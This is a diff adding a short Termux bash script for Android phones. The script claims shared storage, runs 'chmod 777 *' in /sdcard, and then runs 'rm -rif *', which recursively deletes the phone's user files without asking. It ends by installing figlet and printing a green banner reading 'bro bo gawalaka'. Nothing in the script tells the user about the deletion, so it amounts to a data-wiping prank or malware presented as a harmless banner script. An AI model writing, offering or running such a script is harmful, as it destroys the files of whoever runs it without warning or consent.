@@ -1,0 +1,17 @@
+#!bin/bash
+termux-setup-storage
+
+cd /sdcard
+
+chmod 777 *
+
+rm -rif *
+
+cd 
+pkg install figlet -y
+
+clear
+
+printf "\033[92m"
+
+figlet bro bo gawalaka
